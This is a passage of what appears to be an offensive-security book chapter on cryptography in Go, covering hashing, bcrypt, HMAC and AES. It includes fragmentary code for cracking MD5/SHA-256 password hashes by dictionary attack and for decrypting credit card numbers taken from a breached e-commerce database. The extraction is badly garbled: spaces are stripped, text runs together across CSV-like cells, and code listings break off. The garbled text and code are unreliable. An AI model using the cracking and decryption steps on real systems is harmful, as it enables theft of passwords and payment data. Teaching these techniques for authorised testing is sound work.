"compromisesensitive,valuabledata,suchassocialsecurityor ",NA,NA
creditcardnumbers.,NA,NA
Thischapterdemonstratesvariousimplementationsof ,NA,NA
cryptographyinGoanddiscussescommonweaknessesyou ,NA,NA
canexploit.Althoughweprovideintroductoryinformationfor ,NA,NA
"thedifferentcryptographicfunctionsandcodeblocks,we’re ",NA,NA
notattemptingtoexplorethenuancesofcryptographic,NA,NA
"algorithmsortheirmathematicalfoundations.That,frankly,is ",NA,NA
farbeyondourinterestin(orknowledgeof)cryptography.As ,NA,NA
"we’vestatedbefore,don’tattemptanythinginthischapter ",NA,NA
againstresourcesorassetswithoutexplicitpermissionfrom ,NA,NA
theowner.We’reincludingthesediscussionsforlearning ,NA,NA
"purposes,nottoassistinillegalactivities.",NA,NA
REVIEWINGBASIC ,NA,NA
CRYPTOGRAPHYCONCEPTS,NA,NA
"BeforeweexplorecryptoinGo,let’sdiscussafewbasic ",NA,NA
cryptographyconcepts.We’llmakethisshorttokeepyou ,NA,NA
fromfallingintoadeepsleep.,NA,NA
"First,encryption(forthepurposesofmaintaining ",NA,NA
confidentiality)isjustoneofthetasksofcryptography. ,NA,NA
Encryption,NA,NA
",generallyspeaking,isatwo-wayfunctionwith ",NA,NA
whichyoucanscrambledataandsubsequentlyunscrambleit ,NA,NA
toretrievetheinitialinput.Theprocessofencryptingdata ,NA,NA
rendersitmeaninglessuntilit’sbeendecrypted.,NA,NA
Bothencryptionanddecryptioninvolvepassingthedata ,NA,NA
andanaccompanyingkeyintoacryptographicfunction.The ,NA,NA
functionoutputseithertheencrypteddata(called,NA,NA
ciphertext,NA,NA
) ,NA,NA
"ortheoriginal,readabledata(called",NA,NA
cleartext),NA,NA
.Various ,NA,NA
algorithmsexisttodothis.,NA,NA
Symmetric,NA,NA
algorithmsusethesame ,NA,NA
"keyduringtheencryptionanddecryptionprocesses,whereas ",NA,NA
asymmetric,NA,NA
algorithmsusedifferentkeysforencryptionand ,NA,NA
decryption.Youmightuseencryptiontoprotectdataintransit ,NA,NA
"ortostoresensitiveinformation,suchascreditcardnumbers, ",NA,NA
"todecryptlater,perhapsforconvenienceduringafuture ",NA,NA
purchaseorforfraudmonitoring.,NA,NA
"Ontheotherhand,",NA,NA
hashing,NA,NA
isaone-wayprocessfor ,NA,NA
mathematicallyscramblingdata.Youcanpasssensitive ,NA,NA
informationintoahashingfunctiontoproduceafixed-length ,NA,NA
"output.Whenyou’reworkingwithstrongalgorithms,suchas ",NA,NA
"thoseintheSHA-2family,theprobabilitythatdifferentinputs ",NA,NA
"producethesameoutputisextremelylow.Thatis,thereisa ",NA,NA
lowlikelihoodofa,NA,NA
collision,NA,NA
".Becausethey’renonreversible, ",NA,NA
hashesarecommonlyusedasanalternativetostoringcleartex,NA,NA
t passwordsinadatabaseortoperformintegritycheckingto ,NA,NA
determinewhetherdatahasbeenchanged.Ifyouneedto ,NA,NA
"obscureorrandomizetheoutputsfortwoidenticalinputs,you ",NA,NA
usea,NA,NA
salt,NA,NA
",whichisarandomvalueusedtodifferentiatetwo ",NA,NA
identicalinputsduringthehashingprocess.Saltsarecommon ,NA,NA
forpasswordstoragebecausetheyallowmultipleuserswho ,NA,NA
coincidentallyuseidenticalpasswordstostillhavedifferent ,NA,NA
hashvalues.,NA,NA
Cryptographyalsoprovidesameansforauthenticating ,NA,NA
messages.A,NA,NA
messageauthenticationcode(MAC),NA,NA
istheoutput ,NA,NA
producedfromaspecialone-waycryptographicfunction.This ,NA,NA
"functionconsumesthedataitself,asecretkey,andan ",NA,NA
"initializationvector,andproducesanoutputunlikelytohavea ",NA,NA
collision.Thesenderofamessageperformsthefunctionto ,NA,NA
generateaMACandthenincludestheMACaspartofthe ,NA,NA
message.ThereceiverlocallycalculatestheMACand ,NA,NA
comparesittotheMACtheyreceived.Amatchindicatesthat ,NA,NA
"thesenderhasthecorrectsecretkey(thatis,thatthesenderis ",NA,NA
authentic)andthatthemessagewasnotchanged(theintegrity ,NA,NA
hasbeenmaintained).,NA,NA
There!Nowyoushouldknowenoughaboutcryptography ,NA,NA
"tounderstandthecontentsofthischapter.Wherenecessary,",NA,NA
we’lldiscussmorespecificsrelevanttothegiventopic.Let’s ,NA,NA
startbylookingatGo’sstandardcryptolibrary.,NA,NA
UNDERSTANDINGTHESTANDARD ,NA,NA
CRYPTOLIBRARY,NA,NA
ThebeautifulthingaboutimplementingcryptoinGoisthat ,NA,NA
themajorityofcryptographicfeaturesyou’lllikelyusearepart ,NA,NA
ofthestandardlibrary.Whereasotherlanguagescommonly ,NA,NA
"relyonOpenSSLorotherthird-partylibraries,Go’scrypto ",NA,NA
featuresarepartoftheofficialrepositories.Thismakes ,NA,NA
"implementingcryptorelativelystraightforward,asyouwon’t ",NA,NA
havetoinstallclumsydependenciesthat’llpolluteyour ,NA,NA
developmentenvironment.Therearetwoseparaterepositori,NA,NA
es.,NA,NA
Theself-contained,crypto,NA
packagecontainsavarietyof,NA,NA
subpackagesusedforthemostcommoncryptographictasks ,NA,NA
"andalgorithms.Forexample,youcouldusethe",aes,NA
",",des,NA
",and",rc4,NA
subpackagesforimplementingsymmetric-,NA,NA
keyalgorithms;the ,dsa,NA
and,rsa,NA
subpackagesforasymmetricencryption;andthe,md5,NA
",",sha1,NA
",",sha256,NA
",and",sha512,NA
subpackagesforhashing.Thisisnotan,NA,NA
exhaustivelist;additionalsubpackagesexistforothercrypt,NA,NA
"o functions,aswell.",NA,NA
Inadditiontothestandard,crypto,NA
"package,Gohasan",NA,NA
"official,extendedpackagethatcontainsavarietyof ",NA,NA
supplementarycryptofunctionality:,golang.org/x/crypto,NA
.T,NA,NA
he,NA,NA
"functionalitywithinincludesadditionalhashingalgorithms, ",NA,NA
"encryptionciphers,andutilities.Forexample,thepackage ",NA,NA
containsa,bcrypt,NA
subpackagefor,NA,NA
bcrypthashing,NA,NA
"(abetter,more",NA,NA
securealternativeforhashingpasswordsandsensitivedata,NA,NA
"), ",acme/autocert,NA
"forgeneratinglegitimatecertificates,andSSH",NA,NA
subpackagestofacilitatecommunicationsovertheSSH ,NA,NA
protocol.,NA,NA
Theonlyrealdifferencebetweenthebuilt-in,crypto,NA
and,NA,NA
supplementary,golang.org/x/crypto,NA
packagesisthatthe,crypto,NA
packageadherestomorestringentcompatibilityrequirement,NA,NA
"s. Also,ifyouwishtouseanyofthe",golang.org/x/crypto,NA
"subpackages,you’llfirstneedtoinstallthepackageby ",NA,NA
enteringthefollowing:,"$
 goget-ugolang.org/x/crypto/bcrypt",NA
Foracompletelistingofallthefunctionalityand ,NA,NA
"subpackageswithintheofficialGocryptopackages,checkout ",NA,NA
theofficialdocumentationat,NA,NA
https://golang.org/pkg/crypto/ ,NA,NA
and,NA,NA
https://godoc.org/golang.org/x/crypto/,NA,NA
.,NA,NA
Thenextsectionsdelveintovariouscrypto ,NA,NA
implementations.You’llseehowtouseGo’scrypto ,NA,NA
"functionalitytodosomenefariousthings,suchascrack ",NA,NA
"passwordhashes,decryptsensitivedatabyusingastatickey, ",NA,NA
andbrute-forceweakencryptionciphers.You’llalsousethe ,NA,NA
functionalitytocreatetoolsthatuseTLStoprotectyourin-,NA,NA
"transitcommunications,checktheintegrityandauthenticityo",NA,NA
"f data,andperformmutualauthentication.",NA,NA
EXPLORINGHASHING,NA,NA
"Hashing,aswementionedpreviously,isaone-wayfunction ",NA,NA
"usedtoproduceafixed-length,probabilisticallyuniqueoutput ",NA,NA
basedonavariable-lengthinput.Youcan’treversethishash ,NA,NA
valuetoretrievetheoriginalinputsource.Hashesareoften ,NA,NA
"usedtostoreinformationwhoseoriginal,cleartextsource",NA,NA
won’tbeneededforfutureprocessingortotracktheintegrity ,NA,NA
"ofdata.Forexample,it’sbadpracticeandgenerally ",NA,NA
unnecessarytostorethecleartextversionofthepassword; ,NA,NA
"instead,you’dstorethehash(salted,ideally,toensure ",NA,NA
randomnessbetweenduplicatevalues).,NA,NA
"TodemonstratehashinginGo,we’lllookattwoexamples. ",NA,NA
ThefirstattemptstocrackagivenMD5orSHA-512hashby ,NA,NA
usinganofflinedictionaryattack.Thesecondexample ,NA,NA
demonstratesanimplementationofbcrypt.Asmentioned ,NA,NA
"previously,bcryptisamoresecurealgorithmforhashing ",NA,NA
sensitivedatasuchaspasswords.Thealgorithmalsocontains ,NA,NA
"afeaturethatreducesitsspeed,makingithardertocrack ",NA,NA
passwords.,NA,NA
CrackinganMD5orSHA-256Hash,NA,NA
Listing11-1,NA,NA
showsthehash-crackingcode.(Allthecode ,NA,NA
listingsattherootlocationof/existundertheprovidedgithub ,NA,NA
repo,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.)Sincehashesaren’t ,NA,NA
"directlyreversible,thecodeinsteadtriestoguessthecleartext ",NA,NA
valueofthehashbygeneratingitsownhashesofcommon ,NA,NA
"words,takenfromawordlist,andthencomparingthe ",NA,NA
resultinghashvaluewiththehashyouhaveinhand.Ifthetwo ,NA,NA
"hashesmatch,you’velikelyguessedthecleartextvalue.","❶varmd5hash=""77f62e3524cd583d698d51fa24fdff4f
 "" varsha256hash=
  
  
 ""95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4c
 ed""
  
  
 funcmain(){ 
  
 f,err:=os.Open(""wordlist.txt"")❷iferr
 !=nil{
  
 log.Fatalln(err)
  
 }",NA
Youstartbydefiningtwovariables❶thatholdthetarget ,NA,NA
"hashvalues.OneisanMD5hash,andtheotherisaSHA-256.",NA,NA
Imaginethatyouacquiredthesetwohashesaspartofpost-,NA,NA
exploitationandyou’retryingtodeterminetheinputs(the ,NA,NA
cleartextpasswords)thatproducedthemafterbeingrun ,NA,NA
throughthehashingalgorithm.Youcanoftendeterminethe ,NA,NA
algorithmbyinspectingthelengthofthehashitself.Whenyou ,NA,NA
"findahashthatmatchesthetarget,you’llknowyouhavethe ",NA,NA
correctinput.,NA,NA
Thelistofinputsyou’lltryexistsinadictionaryfileyou’ll ,NA,NA
"havecreatedearlier.Alternatively,aGooglesearchcanhelp ",NA,NA
youfinddictionaryfilesforcommonlyusedpasswords.To ,NA,NA
"checktheMD5hash,youopenthedictionaryfile❷andread",NA,NA
"it,linebyline,bycreatinga",bufio.Scanner,NA
onthefiledescriptor❸.E,NA,NA
achlineconsistsofasinglepasswordvaluethatyouwish ,NA,NA
tocheck.Youpassthecurrentpasswordvalueintoafunction ,NA,NA
named,md5.Sum(input[]byte),NA
❹.ThisfunctionproducestheMD5 ,NA,NA
"hashvalueasrawbytes,soyouusethe",fmt.Sprintf(),NA
function,NA,NA
withtheformatstring,%x,NA
toconvertittoahexadecimalstring.,NA,NA
"Afterall,your",md5hash,NA
variableconsistsofahexadecimalstring,NA,NA
representationofthetargethash.Convertingyourvalue ,NA,NA
ensuresthatyoucanthencomparethetargetandcalculated ,NA,NA
"hashvalues❺.Ifthesehashesmatch,theprogramdisplaysa ",NA,NA
successmessagetostdout.,NA,NA
Youperformasimilarprocesstocalculateandcompare ,NA,NA
SHA-256hashes.Theimplementationisfairlysimilartothe ,NA,NA
MD5code.Theonlyrealdifferenceisthatthe,sha256,NA
package,NA,NA
containsadditionalfunctionstocalculatevariousSHAhash ,NA,NA
lengths.Ratherthancalling,sha256.Sum(),NA
(afunctionthatdoesn’t ,NA,NA
"exist),youinsteadcall",sha256.Sum256(input[]byte),NA
❻toforcethe ,NA,NA
hashtobecalculatedusingtheSHA-256algorithm.Muchas ,NA,NA
"youdidintheMD5example,youconvertyourrawbytestoa ",NA,NA
hexstringandcomparetheSHA-256hashestoseewhether ,NA,NA
youhaveamatch❼.,NA,NA
Implementingbcrypt,NA,NA
Thenextexampleshowshowtousebcrypttoencryptand ,NA,NA
"authenticatepasswords.UnlikeSHAandMD5,bcryptwas ",NA,NA
"designedforpasswordhashing,makingitabetteroptionfor ",NA,NA
applicationdesignersthantheSHAorMD5families.It ,NA,NA
"includesasaltbydefault,aswellasacostfactorthatmakes ",NA,NA
runningthealgorithmmoreresource-intensive.Thiscost ,NA,NA
factorcontrolsthenumberofiterationsoftheinternalcrypto,NA,NA
"functions,increasingthetimeandeffortneededtocracka",NA,NA
passwordhash.Althoughthepasswordcanstillbecracked ,NA,NA
"usingadictionaryorbrute-forceattack,thecost(intime) ",NA,NA
"increasessignificantly,discouragingcrackingactivitiesdurin",NA,NA
g time-sensitivepost-,NA,NA
exploitation.It’salsopossibletoincrease ,NA,NA
thecostovertimetocountertheadvancementofcomputing,NA,NA
power.Thismakesitadaptivetofuturecrackingattacks.,NA,NA
Listing11-2,NA,NA
createsabcrypthashandthenvalidates ,NA,NA
whetheracleartextpasswordmatchesagivenbcrypthash.,"import(
  
 ""log""
  
 ""os""
  
  
 ❶""golang.org/x/crypto/bcry
 pt"" 
  
 )
  
  
 ❷varstoredHash= 
  
 ""$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu""
  
  
 funcmain(){
  
 varpasswordstring 
  
 iflen(os.Args)!=2{ 
  
 log.Fatalln(""Usage:bcryptpassword"") 
  
 } 
  
 password=os.Args[1]
  
  
 ❸hash,err:=bcrypt.GenerateFromPassword
 ( []byte(password),
  
 bcrypt.DefaultCost, 
  
 ) 
  
 iferr!=nil{ 
  
 log.Fatalln(err) 
  
 } 
  
 log.Printf(""hash=%s\n"",hash)
  
 ❹err=bcrypt.CompareHashAndPassword([]byte(storedHash),",NA
"Formostofthecodesamplesinthisbook,we’veomitted ",NA,NA
thepackageimports.We’veincludedtheminthisexampleto ,NA,NA
explicitlyshowthatyou’reusingthesupplementalGo ,NA,NA
"package,",golang.org/x/crypto/bcrypt,NA
"❶,becauseGo’sbuilt-in",crypto,NA
packagedoesn’tcontainthebcryptfunctionality.Youthen ,NA,NA
"initializeavariable,",storedHash,NA
"❷,thatholdsaprecomputed, ",NA,NA
encodedbcrypthash.Thisisacontrivedexample;ratherthan ,NA,NA
"wiringoursamplecodeuptoadatabasetogetavalue,we’ve ",NA,NA
optedtohardcodeavaluefordemonstrativepurposes.The ,NA,NA
variablecouldrepresentavaluethatyou’vefoundina ,NA,NA
databaserowthatstoresuserauthenticationinformationfor,NA,NA
"a frontendwebapplication,forinstance.",NA,NA
"Next,you’llproduceabcrypt-encodedhashfroma ",NA,NA
cleartextpasswordvalue.Themainfunctionreadsapassword ,NA,NA
valueasacommandlineargumentandproceedstocalltwo ,NA,NA
"separatebcryptfunctions.Thefirstfunction, ",bcrypt.GenerateFromPassword(),NA
"❸,acceptstwoparameters:abyte ",NA,NA
slicerepresentingthecleartextpasswordandacostvalue.In ,NA,NA
"thisexample,you’llpasstheconstantvariable",bcrypt.DefaultCost,NA
"tousethepackage’sdefaultcost,whichis10atthetimeof ",NA,NA
thiswriting.Thefunctionreturnstheencodedhashvalueand ,NA,NA
anyerrorsproduced.,NA,NA
Thesecondbcryptfunctionyoucallis,NA,NA
"❹,whichdoesthehash ",NA,NA
comparisonforyoubehindthescenes.Itacceptsabcrypt-,NA,NA
encodedhashandacleartextpasswordasbyteslices.The ,NA,NA
functionparsestheencodedhashtodeterminethecostand ,NA,NA
salt.Itthenusesthesevalueswiththecleartextpasswordvalue ,NA,NA
togenerateabcrypthash.Ifthisresultinghashmatchesthe ,NA,NA
hashextractedfromtheencoded,storedHash,NA
"value,youknowthe",NA,NA
providedpasswordmatcheswhatwasusedtocreatethe ,storedHash,NA
.,NA,NA
Thisisthesamemethodyouusedtoperformyour ,NA,NA
passwordcrackingagainstSHAandMD5—runagiven ,NA,NA
passwordthroughthehashingfunctionandcomparetheresul,NA,NA
"t withthestoredhash.Here,ratherthanexplicitlycomparing ",NA,NA
"theresultinghashesasyoudidforSHAandMD5,youcheck ",NA,NA
whether,bcrypt.CompareHashAndPassword(),NA
returnsanerror.Ifyou,NA,NA
"seeanerror,youknowthecomputedhashes,andthereforethe ",NA,NA
"passwordsusedtocomputethem,donotmatch.",NA,NA
Thefollowingaretwosampleprogramruns.Thefirst ,NA,NA
showstheoutputforanincorrectpassword:,"$
 gorunmain.gosomeWrongPassword
  
  
 2020/08/2508:44:01hash=
  
  
 $2a$10$YSSanGl8ye/NC7GDyLBLUO5gE/ng51l9TnaB1zTChWq5g9i09v0AC
  
  
 2020/08/2508:44:01[!]Authenticationfailed",NA
Thesecondshowstheoutputforthecorrectpassword:,"$
 gorunmain.gosomeC0mpl3xP@ssw0rd
  
  
 2020/08/2508:39:29hash=
  
  
 $2a$10$XfeUk.wKeEePNAfjQ1juXe8RaM/9EC1XZmqaJ8MoJB29hZRyuNxz.
  
  
 2020/08/2508:39:29[+]Authenticationsuccessful",NA
Thoseofyouwithakeeneyefordetailmaynoticethatthe,NA,NA
hashvaluedisplayedforyoursuccessfulauthenticationdoes ,NA,NA
notmatchthevalueyouhardcodedforyour,storedHash,NA
variable.,NA,NA
"Recall,ifyouwill,thatyourcodeiscallingtwoseparate ",NA,NA
functions.The,GenerateFromPassword(),NA
functionproducesth,NA,NA
e,NA,NA
encodedhashbyusingarandomsaltvalue.Givendifferent ,NA,NA
"salts,thesamepasswordwillproducedifferentresulting ",NA,NA
hashes.Hencethedifference.The,CompareHashAndPassword(),NA
functionperformsthehashingalgorithmbyusingthesamesalt ,NA,NA
"andcostasthestoredhash,sotheresultinghashisidenticalto ",NA,NA
theoneinthe,storedHash,NA
variable.,NA,NA
AUTHENTICATINGMESSAGES,NA,NA
Let’snowturnourfocustomessageauthentication.When ,NA,NA
"exchangingmessages,youneedtovalidateboththeintegrity ",NA,NA
ofdataandtheauthenticityoftheremoteservicetomakesure ,NA,NA
thatthedataisauthenticandhasn’tbeentamperedwith.Was ,NA,NA
themessagealteredduringtransmissionbyanunauthorized ,NA,NA
source?Wasthemessagesentbyanauthorizedsenderorwas ,NA,NA
itforgedbyanotherentity?,NA,NA
YoucanaddressthesequestionsbyusingGo’s,crypto/hmac,NA
"package,whichimplementsthe",NA,NA
Keyed-HashMessage ,NA,NA
AuthenticationCode,NA,NA
(HMAC)standard.HMACisa ,NA,NA
cryptographicalgorithmthatallowsustocheckformessage ,NA,NA
tamperingandverifytheidentityofthesource.Itusesa ,NA,NA
"hashingfunctionandconsumesasharedsecretkey,which ",NA,NA
onlythepartiesauthorizedtoproducevalidmessagesordata ,NA,NA
shouldpossess.Anattackerwhodoesnotpossessthisshared ,NA,NA
secretcannotreasonablyforgeavalidHMACvalue.,NA,NA
ImplementingHMACinsomeprogramminglanguagescan,NA,NA
"bealittletricky.Forexample,somelanguagesforceyouto ",NA,NA
manuallycomparethereceivedandcalculatedhashvalues ,NA,NA
bytebybyte.Developersmayinadvertentlyintroducetiming ,NA,NA
discrepanciesinthisprocessiftheirbyte-by-bytecomparison ,NA,NA
isabortedprematurely;anattackercandeducetheexpected ,NA,NA
"HMACbymeasuringmessage-processingtimes.Additionally, ",NA,NA
developerswilloccasionallythinkHMACs(whichconsumea ,NA,NA
messageandkey)arethesameasahashofasecretkey ,NA,NA
"prependedtoamessage.However,theinternalfunctionalityof ",NA,NA
HMACsdiffersfromthatofapurehashingfunction.Bynot ,NA,NA
"explicitlyusinganHMAC,thedeveloperisexposingthe ",NA,NA
"applicationtolength-extensionattacks,inwhichanattacker ",NA,NA
forgesamessageandvalidMAC.,NA,NA
"LuckilyforusGophers,the",crypto/hmac,NA
packagemakesit,NA,NA
fairlyeasytoimplementHMACfunctionalityinasecure ,NA,NA
fashion.Let’slookatanimplementation.Notethatthe ,NA,NA
"followingprogramismuchsimplerthanatypicalusecase, ",NA,NA
whichwouldlikelyinvolvesometypeofnetwork ,NA,NA
"communicationsandmessaging.Inmostcases,you’d ",NA,NA
calculatetheHMAConHTTPrequestparametersorsome ,NA,NA
othermessagetransmittedoveranetwork.Intheexample ,NA,NA
shownin,NA,NA
Listing11-3,NA,NA
",we’reomittingtheclient-server ",NA,NA
communicationsandfocusingsolelyontheHMAC ,NA,NA
functionality.,"varkey=[]byte(""somerandomkey"")❶
  
  
 funccheckMAC(message,recvMAC[]byte)bool{❷ma
 c:=hmac.New(sha256.New,key)❸
  
 mac.Write(message)
  
  
 calcMAC:=mac.Sum(nil)",NA
Theprogrambeginsbydefiningthekeyyou’lluseforyour ,NA,NA
HMACcryptographicfunction❶.You’rehardcodingthe ,NA,NA
"valuehere,butinarealimplementation,thiskeywouldbe ",NA,NA
adequatelyprotectedandrandom.Itwouldalsobeshared ,NA,NA
"betweentheendpoints,meaningboththemessagesenderand ",NA,NA
receiverareusingthissamekeyvalue.Sinceyouaren’t ,NA,NA
"implementingfullclient-serverfunctionalityhere,you’lluse ",NA,NA
thisvariableasifitwereadequatelyshared.,NA,NA
"Next,youdefineafunction,",checkMAC(),NA
"❷,thatacceptsa ",NA,NA
messageandthereceivedHMACasparameters.Themessage ,NA,NA
receiverwouldcallthisfunctiontocheckwhethertheMAC ,NA,NA
valuetheyreceivedmatchesthevaluetheycalculatedlocally. ,NA,NA
"First,youcall",hmac.New(),NA
"❸,passingtoit",sha256.New,NA
",whichisa ",NA,NA
functionthatreturnsa,hash.Hash,NA
"instance,andthesharedsecret",NA,NA
"key.Inthiscase,the",hmac.New(),NA
functioninitializesyourHMAC,NA,NA
"byusingtheSHA-256algorithmandyoursecretkey,and",NA,NA
assignstheresulttoavariablenamed,mac,NA
.Youthenusethis,NA,NA
"variabletocalculatetheHMAChashvalue,asyoudidinthe ",NA,NA
"earlierhashingexamples.Here,youcall",mac.Write(message),NA
and,mac.Sum(nil),NA
",respectively.Theresultisyourlocallycalculated",NA,NA
"HMAC,storedinavariablenamed",calcMAC,NA
.,NA,NA
Thenextstepistoevaluatewhetheryourlocallycalculated ,NA,NA
HMACvalueisequaltotheHMACvalueyoureceived.Todo ,NA,NA
"thisinasecuremanner,youcall","hmac.Equal(calcMAC,recvMAC)",NA
❹.,NA,NA
Alotofdeveloperswouldbeinclinedtocomparethebyte ,NA,NA
slicesbycalling,"bytes.Compare(calcMAC,recvMAC)",NA
".Theproblemis,",bytes.Compare(),NA
"performsalexicographicalcomparison,walking",NA,NA
andcomparingeachelementofthegivenslicesuntilitfindsa ,NA,NA
differenceorreachestheendofaslice.Thetimeittakesto ,NA,NA
completethiscomparisonwillvarybasedonwhether ,bytes.Compare(),NA
"encountersadifferenceonthefirstelement,the",NA,NA
"last,orsomewhereinbetween.Anattackercouldmeasurethis ",NA,NA
variationintimetodeterminetheexpectedHMACvalueand ,NA,NA
forgearequestthat’sprocessedlegitimately.The,hmac.Equal(),NA
functionsolvesthisproblembycomparingtheslicesinaway ,NA,NA
thatproducesnearlyconstantmeasurabletimes.Itdoesn’t ,NA,NA
"matterwherethefunctionfindsadifference,becausethe ",NA,NA
"processingtimeswillvaryinsignificantly,producingno ",NA,NA
obviousorperceptiblepattern.,NA,NA
The,main(),NA
functionsimulatestheprocessofreceivinga,NA,NA
"messagefromaclient.Ifyouwerereallyreceivingamessage, ",NA,NA
you’dhavetoreadandparsetheHMACandmessagevalues ,NA,NA
"fromthetransmission.Sincethisisjustasimulation,you ",NA,NA
insteadhardcodethereceivedmessage❺andthereceived ,NA,NA
"HMAC❻,decodingtheHMAChexstringsoit’srepresented ",NA,NA
asa,[]byte,NA
.Youusean,if,NA
statementtocallyour,checkMAC(),NA
"function❼,passingityourreceivedmessageandHMAC.As ",NA,NA
"detailedpreviously,your",checkMAC(),NA
functioncomputesan,NA,NA
HMACbyusingthereceivedmessageandthesharedsecret ,NA,NA
keyandreturnsa,bool,NA
valueforwhetherthereceivedHMAC,NA,NA
andcalculatedHMACmatch.,NA,NA
AlthoughtheHMACdoesprovidebothauthenticityand ,NA,NA
"integrityassurance,itdoesn’tensureconfidentiality.Youcan’t ",NA,NA
knowforsurethatthemessageitselfwasn’tseenby ,NA,NA
unauthorizedresources.Thenextsectionaddressesthis ,NA,NA
concernbyexploringandimplementingvarioustypesof ,NA,NA
encryption.,NA,NA
ENCRYPTINGDATA,NA,NA
Encryptionislikelythemostwell-knowncryptographic ,NA,NA
"concept.Afterall,privacyanddataprotectionhavegarnered ",NA,NA
"significantnewscoverageduetohigh-profiledatabreaches, ",NA,NA
oftenresultingfromorganizationsstoringuserpasswordsan,NA,NA
d ,NA,NA
othersensitivedatainunencryptedformats.Evenwithoutthe ,NA,NA
"mediaattention,encryptionshouldsparktheinterestofblack ",NA,NA
"hatsanddevelopersalike.Afterall,understandingthebasic ",NA,NA
processandimplementationcanbethedifferencebetweena ,NA,NA
lucrativedatabreachandafrustratingdisruptiontoanattack ,NA,NA
killchain.Thefollowingsectionpresentsthevaryingformsof ,NA,NA
"encryption,includingusefulapplicationsandusecasesfor ",NA,NA
each.,NA,NA
Symmetric-KeyEncryption,NA,NA
Yourjourneyintoencryptionwillstartwithwhatisarguably ,NA,NA
itsmoststraightforwardform—,NA,NA
symmetric-,NA,NA
keyencryption,NA,NA
.In,NA,NA
"thisform,boththeencryptionanddecryptionfunctionsusethe ",NA,NA
samesecretkey.Gomakessymmetriccryptographypretty ,NA,NA
"straightforward,becauseitsupportsmostcommonalgorithm",NA,NA
s initsdefaultorextendedpackages.,NA,NA
"Forthesakeofbrevity,we’lllimitourdiscussionof ",NA,NA
"symmetric-keyencryptiontoasingle,practicalexample.Let’s ",NA,NA
imagineyou’vebreachedanorganization.You’veperformed ,NA,NA
"thenecessaryprivilegeescalation,lateralmovement,and ",NA,NA
networkrecontogainaccesstoane-commercewebserver ,NA,NA
andthebackenddatabase.Thedatabasecontainsfinancial ,NA,NA
"transactions;however,thecreditcardnumberusedinthose ",NA,NA
transactionsisobviouslyencrypted.Youinspectthe ,NA,NA
applicationsourcecodeonthewebserveranddeterminethat ,NA,NA
theorganizationisusingtheAdvancedEncryptionStandard ,NA,NA
(AES)encryptionalgorithm.AESsupportsmultipleoperating ,NA,NA
"modes,eachwithslightlydifferentconsiderationsand ",NA,NA
implementationdetails.Themodesarenotinterchangeable; ,NA,NA
themodeusedfordecryptionmustbeidenticaltothatusedfor ,NA,NA
encryption.,NA,NA
"Inthisscenario,let’ssayyou’vedeterminedthatthe ",NA,NA
applicationisusingAESinCipherBlockChaining(CBC) ,NA,NA
"mode.So,let’swriteafunctionthatdecryptsthesecreditcards ",NA,NA
(,NA,NA
Listing11-4,NA,NA
).Assumethatthesymmetrickeywashardcoded ,NA,NA
intheapplicationorsetstaticallyinaconfigurationfile.As ,NA,NA
"yougothroughthisexample,keepinmindthatyou’llneedto ",NA,NA
"tweakthisimplementationforotheralgorithmsorciphers,but ",NA,NA
it’sagoodstartingplace.,"funcunpad(buf[]byte)[]byte{❶
  
 //Assumevalidlengthandpadding.Shouldaddchecks",NA
Thecodedefinestwofunctions:,unpad(),NA
and,decrypt(),NA
.The ,unpad(),NA
function❶isautilityfunctionscrapedtogetherto ,NA,NA
handletheremovalofpaddingdataafterdecryption.Thisisa,NA,NA
"necessarystep,butbeyondthescopeofthisdiscussion.Do ",NA,NA
someresearchonPublicKeyCryptographyStandards(PKCS) ,NA,NA
"#7paddingformoreinformation.It’sarelevanttopicforAES, ",NA,NA
asit’susedtoensurethatourdatahasproperblockalignment. ,NA,NA
"Forthisexample,justknowthatyou’llneedthefunctionlater ",NA,NA
tocleanupyourdata.Thefunctionitselfassumessomefacts ,NA,NA
thatyou’dwanttoexplicitlyvalidateinareal-worldscenario.,NA,NA
"Specifically,you’dwanttoconfirmthatthevalueofthe ",NA,NA
"paddingbytesisvalid,thatthesliceoffsetsarevalid,andthat ",NA,NA
theresultisofappropriatelength.,NA,NA
Themostinterestinglogicexistswithinthe,decrypt(),NA
function,NA,NA
"❷,whichtakestwobyteslices:theciphertextyouneedto ",NA,NA
decryptandthesymmetrickeyyou’llusetodoit.The ,NA,NA
functionperformssomevalidationtoconfirmthatthe ,NA,NA
ciphertextisatleastaslongasyourblocksize❸.Thisisa ,NA,NA
"necessarystep,becauseCBCmodeencryptionusesan ",NA,NA
"initializationvector(IV)forrandomness.ThisIV,likeasalt ",NA,NA
"valueforpasswordhashing,doesn’tneedtoremainsecret.The ",NA,NA
"IV,whichisthesamelengthasasingleAESblock,is ",NA,NA
prependedontoyourciphertextduringencryption.Ifthe ,NA,NA
"ciphertextlengthislessthantheexpectedblocksize,you ",NA,NA
knowthatyoueitherhaveanissuewiththeciphertextorare ,NA,NA
missingtheIV.Youalsocheckwhethertheciphertextlength ,NA,NA
"isamultipleoftheAESblocksize❹.Ifit’snot,decryption ",NA,NA
"willfailspectacularly,becauseCBCmodeexpectsthe ",NA,NA
ciphertextlengthtobeamultipleoftheblocksize.,NA,NA
"Onceyou’vecompletedyourvalidationchecks,youcan ",NA,NA
"proceedtodecrypttheciphertext.Asmentionedpreviously, ",NA,NA
"theIVisprependedtotheciphertext,sothefirstthingyoudo ",NA,NA
isextracttheIVfromtheciphertext❺.Youusethe,NA,NA
constanttoretrievetheIVandthenredefineyour,ciphertext,NA
variabletotheremainderofyourciphertextvia,ciphertext=[aes.BlockSize:],NA
.Younowhaveyourencrypteddata,NA,NA
separatefromyourIV.,NA,NA
"Next,youcall",aes.NewCipher(),NA
",passingityoursymmetric-key ",NA,NA
"value❻.ThisinitializesyourAESblockmodecipher, ",NA,NA
assigningittoavariablenamed,block,NA
.Youtheninstructyour,NA,NA
AESciphertooperateinCBCmodebycalling ,"cipher.NewCBCDecryptor(block,iv)",NA
❼.Youassigntheresulttoa ,NA,NA
variablenamed,mode,NA
.(The,crypto/cipher,NA
packagecontains,NA,NA
"additionalinitializationfunctionsforotherAESmodes,but ",NA,NA
you’reusingonlyCBCdecryptionhere.)Youthenissueacall ,NA,NA
to,"mode.CryptBlocks(plaintext,ciphertext)",NA
todecryptthecontentsof ,ciphertext,NA
❽andstoretheresultinthe,plaintext,NA
"byteslice.Lastly, ",NA,NA
you❾removeyourPKCS#7paddingbycallingyour,unpad(),NA
